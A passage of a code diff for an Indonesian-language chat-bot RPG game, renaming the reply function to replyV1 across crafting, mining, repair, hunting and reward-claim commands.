+        if (global.db.erpg[m.sender].kayu < kayu) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kain < kain) return replyV1(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
         global.db.erpg[m.sender].kapal = true
         global.db.erpg[m.sender].besi -= besi
         global.db.erpg[m.sender].kayu -= kayu
@@ -18814,11 +18787,11 @@ tidak akan bisa memilih/ganti lagi`)
           quoted: qtoko
         })
       } else if (args[0] === "kapak") {
-        if (global.db.erpg[m.sender].kapak) return Reply('Kamu Sudah Memiliki Kapak!')
+        if (global.db.erpg[m.sender].kapak) return replyV1('Kamu Sudah Memiliki Kapak!')
         let besi = Number(2)
         let kayu = Number(1)
-        if (global.db.erpg[m.sender].besi < besi) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < kayu) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].besi < besi) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kayu < kayu) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].kapak = true
         global.db.erpg[m.sender].besi -= besi
         global.db.erpg[m.sender].kayu -= kayu
@@ -18847,13 +18820,13 @@ tidak akan bisa memilih/ganti lagi`)
           quoted: qtoko
         })
       } else if (args[0] === "rumah") {
-        if (!(`${global.db.erpg[m.sender].wilayahrumah}` === `${global.db.erpg[m.sender].wilayah}`)) return Reply(`Kamu Saat Ini Sedang Di ${global.db.erpg[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
-        if (!args[1]) return Reply('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
-        if (isNaN(args[1])) return Reply('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
+        if (!(`${global.db.erpg[m.sender].wilayahrumah}` === `${global.db.erpg[m.sender].wilayah}`)) return replyV1(`Kamu Saat Ini Sedang Di ${global.db.erpg[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
+        if (!args[1]) return replyV1('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
+        if (isNaN(args[1])) return replyV1('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
         let besi = Number(parseInt(args[1]) * 6)
         let kayu = Number(parseInt(args[1]) * 20)
-        if (global.db.erpg[m.sender].besi < besi) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < kayu) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].besi < besi) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kayu < kayu) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].rumah += parseInt(args[1])
         global.db.erpg[m.sender].besi -= besi
         global.db.erpg[m.sender].kayu -= kayu
@@ -18882,11 +18855,11 @@ tidak akan bisa memilih/ganti lagi`)
           quoted: qtoko
         })
       } else if (args[0] === "pickaxe") {
-        if (global.db.erpg[m.sender].pickaxe) return Reply('Kamu Sudah Memiliki Pickaxe!')
+        if (global.db.erpg[m.sender].pickaxe) return replyV1('Kamu Sudah Memiliki Pickaxe!')
         let besi = Number(2)
         let kayu = Number(1)
-        if (global.db.erpg[m.sender].besi < besi) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < kayu) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].besi < besi) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kayu < kayu) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].pickaxe = true
         global.db.erpg[m.sender].besi -= besi
         global.db.erpg[m.sender].kayu -= kayu
@@ -18915,13 +18888,13 @@ tidak akan bisa memilih/ganti lagi`)
           quoted: qtoko
         })
       } else if (args[0] === "bajuzirah") {
-        if (global.db.erpg[m.sender].bzirah) return Reply('Kamu Sudah Memiliki Baju Zirah!')
+        if (global.db.erpg[m.sender].bzirah) return replyV1('Kamu Sudah Memiliki Baju Zirah!')
         let besi = Number(6)
         let kayu = Number(2)
         let kain = Number(10)
-        if (global.db.erpg[m.sender].besi < besi) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < kayu) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kain < kain) return Reply(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].besi < besi) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kayu < kayu) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kain < kain) return replyV1(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
         global.db.erpg[m.sender].bzirah = true
         global.db.erpg[m.sender].besi -= besi
         global.db.erpg[m.sender].kayu -= kayu
@@ -18951,11 +18924,11 @@ tidak akan bisa memilih/ganti lagi`)
           quoted: qtoko
         })
       } else if (args[0] === "pedang") {
-        if (global.db.erpg[m.sender].pedang) return Reply('Kamu Sudah Memiliki Pedang!')
+        if (global.db.erpg[m.sender].pedang) return replyV1('Kamu Sudah Memiliki Pedang!')
         let besi = Number(3)
         let kayu = Number(1)
-        if (global.db.erpg[m.sender].besi < besi) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < kayu) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].besi < besi) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kayu < kayu) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].pedang = true
         global.db.erpg[m.sender].besi -= besi
         global.db.erpg[m.sender].kayu -= kayu
@@ -19025,8 +18998,8 @@ tidak akan bisa memilih/ganti lagi`)
 
     case 'heal': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].potion < 1) return Reply(`Potion Kamu Habis\nKetik .buy potion 1`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].potion < 1) return replyV1(`Potion Kamu Habis\nKetik .buy potion 1`)
 
       let health = await randomNomor(34, 89)
       let stamina = await randomNomor(55, .78)
@@ -19034,7 +19007,7 @@ tidak akan bisa memilih/ganti lagi`)
       global.db.erpg[m.sender].potion -= 1
       global.db.erpg[m.sender].darahuser += health
       global.db.erpg[m.sender].stamina += stamina
-      Reply(`Berhasil Memulihkan Dengan Potion
+      replyV1(`Berhasil Memulihkan Dengan Potion
 Health: +${health}
 Stamina: +${stamina}`)
     }
@@ -19042,10 +19015,10 @@ Stamina: +${stamina}`)
 
     case 'mining': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (!global.db.erpg[m.sender].pickaxe) return Reply('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
-      if (global.db.erpg[m.sender].darahpickaxe < 1) return Reply('☹️Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].pickaxe) return replyV1('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
+      if (global.db.erpg[m.sender].darahpickaxe < 1) return replyV1('☹️Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let besi = [2, 1, 6, 1, 0, 3, 7, 8, 3, 2, 0, 7, 1, 9]
       let batubara = [1, 1, 2, 1, 0, 6, 0, 0, 2, 5, 1, 0, 1, 0]
       let emas = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
@@ -19092,50 +19065,50 @@ Stamina: +${stamina}`)
     case 'repair':
     case 'rawat': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       let rawat = args[0]
       switch (rawat) {
       case 'kapal':
-        if (!global.db.erpg[m.sender].kapal) return Reply(`*Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
-        if (Number(global.db.erpg[m.sender].darahkapal || 0) > 0) return Reply(`*Kapal Kamu Masih Bagus*`)
-        if (global.db.erpg[m.sender].besi < 5) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < 10) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
+        if (!global.db.erpg[m.sender].kapal) return replyV1(`*Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
+        if (Number(global.db.erpg[m.sender].darahkapal || 0) > 0) return replyV1(`*Kapal Kamu Masih Bagus*`)
+        if (global.db.erpg[m.sender].besi < 5) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].kayu < 10) return replyV1(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].besi -= 5
         global.db.erpg[m.sender].kayu -= 10
         global.db.erpg[m.sender].darahkapal = 100
-        await Reply('✅ Perbaikan selesai. Kondisi item kembali 100%.')
+        await replyV1('✅ Perbaikan selesai. Kondisi item kembali 100%.')
         break
       case 'pickaxe':
-        if (!global.db.erpg[m.sender].pickaxe) return Reply(`*Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
-        if (Number(global.db.erpg[m.sender].darahpickaxe || 0) > 0) return Reply(`*Pickaxe Kamu Masih Bagus*`)
-        if (global.db.erpg[m.sender].besi < 1) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (!global.db.erpg[m.sender].pickaxe) return replyV1(`*Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
+        if (Number(global.db.erpg[m.sender].darahpickaxe || 0) > 0) return replyV1(`*Pickaxe Kamu Masih Bagus*`)
+        if (global.db.erpg[m.sender].besi < 1) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].besi -= 1
         global.db.erpg[m.sender].darahpickaxe = 100
-        await Reply('✅ Perbaikan selesai. Kondisi item kembali 100%.')
+        await replyV1('✅ Perbaikan selesai. Kondisi item kembali 100%.')
         break
       case 'kapak':
-        if (!global.db.erpg[m.sender].kapak) return Reply(`*Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
-        if (Number(global.db.erpg[m.sender].darahkapak || 0) > 0) return Reply(`*Kapak Kamu Masih Bagus*`)
-        if (global.db.erpg[m.sender].besi < 1) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (!global.db.erpg[m.sender].kapak) return replyV1(`*Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
+        if (Number(global.db.erpg[m.sender].darahkapak || 0) > 0) return replyV1(`*Kapak Kamu Masih Bagus*`)
+        if (global.db.erpg[m.sender].besi < 1) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].besi -= 1
         global.db.erpg[m.sender].darahkapak = 100
-        await Reply('✅ Perbaikan selesai. Kondisi item kembali 100%.')
+        await replyV1('✅ Perbaikan selesai. Kondisi item kembali 100%.')
         break
       case 'armor':
-        if (!global.db.erpg[m.sender].bzirah) return Reply(`*Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
-        if (Number(global.db.erpg[m.sender].darahbzirah || 0) > 0) return Reply(`*Baju Zirah Kamu Masih Bagus*`)
-        if (global.db.erpg[m.sender].besi < 2) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (!global.db.erpg[m.sender].bzirah) return replyV1(`*Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
+        if (Number(global.db.erpg[m.sender].darahbzirah || 0) > 0) return replyV1(`*Baju Zirah Kamu Masih Bagus*`)
+        if (global.db.erpg[m.sender].besi < 2) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].besi -= 2
         global.db.erpg[m.sender].darahbzirah = 100
-        await Reply('✅ Perbaikan selesai. Kondisi item kembali 100%.')
+        await replyV1('✅ Perbaikan selesai. Kondisi item kembali 100%.')
         break
       case 'pedang':
-        if (!global.db.erpg[m.sender].pedang) return Reply(`*Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
-        if (Number(global.db.erpg[m.sender].darahpedang || 0) > 0) return Reply(`*Pedang Kamu Masih Bagus*`)
-        if (global.db.erpg[m.sender].besi < 1) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
+        if (!global.db.erpg[m.sender].pedang) return replyV1(`*Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
+        if (Number(global.db.erpg[m.sender].darahpedang || 0) > 0) return replyV1(`*Pedang Kamu Masih Bagus*`)
+        if (global.db.erpg[m.sender].besi < 1) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
         global.db.erpg[m.sender].besi -= 1
         global.db.erpg[m.sender].darahpedang = 100
-        await Reply('✅ Perbaikan selesai. Kondisi item kembali 100%.')
+        await replyV1('✅ Perbaikan selesai. Kondisi item kembali 100%.')
         break
       default:
         let teks = `---------- » *PERBAIKAN* « ----------
@@ -19179,14 +19152,14 @@ ${command} kapak`
     case 'menebang':
     case 'nebang': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (!global.db.erpg[m.sender].kapak) return Reply('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
-      if (global.db.erpg[m.sender].darahkapak < 1) return Reply('☹️Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].kapak) return replyV1('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
+      if (global.db.erpg[m.sender].darahkapak < 1) return replyV1('☹️Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let kayu = await randomNomor(0, 20)
       global.db.erpg[m.sender].kayu += kayu
       global.db.erpg[m.sender].darahkapak -= 20
-      Reply(`*🌳 MENEBANG POHON 🌳*
+      replyV1(`*🌳 MENEBANG POHON 🌳*
 
 Item Yang Didapat:
   ${vircion} • Kayu: ${kayu} (Hasil Tebang)
@@ -19199,16 +19172,16 @@ Item Yang Didapat:
 
       try {
         let waktuu = await clockString(new Date() - global.db.erpg[m.sender].weeklyclaim)
-        if (new Date() - global.db.erpg[m.sender].weeklyclaim < 604800000) return Reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Minggu.`)
+        if (new Date() - global.db.erpg[m.sender].weeklyclaim < 604800000) return replyV1(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Minggu.`)
         let saldo = await randomNomor(1000, 10000)
         let limit = await randomNomor(20, 100)
         global.db.erpg[m.sender].weeklyclaim = new Date * 1
         db.users[m.sender].saldo += saldo
         db.users[m.sender].limit += limit
-        Reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
+        replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
       } catch (err) {
         console.error(err);
-        Reply('Terjadi kesalahan: ' + err);
+        replyV1('Terjadi kesalahan: ' + err);
       }
     }
     break
@@ -19216,19 +19189,19 @@ Item Yang Didapat:
     case 'monthly':
     case 'bulanan': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       try {
         let waktuu = await clockString(new Date() - global.db.erpg[m.sender].monthlyclaim)
-        if (new Date() - global.db.erpg[m.sender].monthlyclaim < 5184000000) return Reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Bulan.`)
+        if (new Date() - global.db.erpg[m.sender].monthlyclaim < 5184000000) return replyV1(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Bulan.`)
         let saldo = await randomNomor(5000, 50000)
         let limit = await randomNomor(30, 200)
         global.db.erpg[m.sender].monthlyclaim = new Date * 1
         db.users[m.sender].saldo += saldo
         db.users[m.sender].limit += limit
-        Reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
+        replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
       } catch (err) {
         console.error(err);
-        Reply('Terjadi kesalahan: ' + err);
+        replyV1('Terjadi kesalahan: ' + err);
       }
     }
     break
@@ -19236,27 +19209,27 @@ Item Yang Didapat:
     case 'yearly':
     case 'tahunan': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       try {
         let waktuu = await clockString(new Date() - global.db.erpg[m.sender].yearlyclaim)
-        if (new Date() - global.db.erpg[m.sender].yearlyclaim < 31536000000) return Reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Tahun.`)
+        if (new Date() - global.db.erpg[m.sender].yearlyclaim < 31536000000) return replyV1(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Tahun.`)
         let saldo = await randomNomor(600000, 6000000)
         let limit = await randomNomor(4000, 24000)
         global.db.erpg[m.sender].yearlyclaim = new Date * 1
         db.users[m.sender].saldo += saldo
         db.users[m.sender].limit += limit
-        Reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
+        replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
       } catch (err) {
         console.error(err);
-        Reply('Terjadi kesalahan: ' + err);
+        replyV1('Terjadi kesalahan: ' + err);
       }
     }
     break
 
     case 'berburu': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let darah = await randomNomor(45, 70)
       let domba = await randomNomor(0, 10)
       let sapi = await randomNomor(0, 10)
@@ -19274,7 +19247,7 @@ Item Yang Didapat:
       let buulu = domba + sapi + ayam
       let bulu = buulu / 2
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].burutime)
-      if (new Date() - global.db.erpg[m.sender].burutime < 18000000) return Reply(`Kamu Baru Saja Berburu ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Berburu`)
+      if (new Date() - global.db.erpg[m.sender].burutime < 18000000) return replyV1(`Kamu Baru Saja Berburu ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Berburu`)
       global.db.erpg[m.sender].burutime = new Date * 1
       global.db.erpg[m.sender].domba += domba
       global.db.erpg[m.sender].sapi += sapi
@@ -19291,7 +19264,7 @@ Item Yang Didapat:
       global.db.erpg[m.sender].gajah += gajah
       global.db.erpg[m.sender].babihutan += buaya
       global.db.erpg[m.sender].darahuser -= darah
-      Reply(`*🏹 BERBURU 🏹*
+      replyV1(`*🏹 BERBURU 🏹*
 
 Item Yang Didapat:
   ${vircion} • Domba: ${domba}
@@ -19316,9 +19289,9 @@ _berburu berikutnya_`)
     break
     case 'adventure': {
 
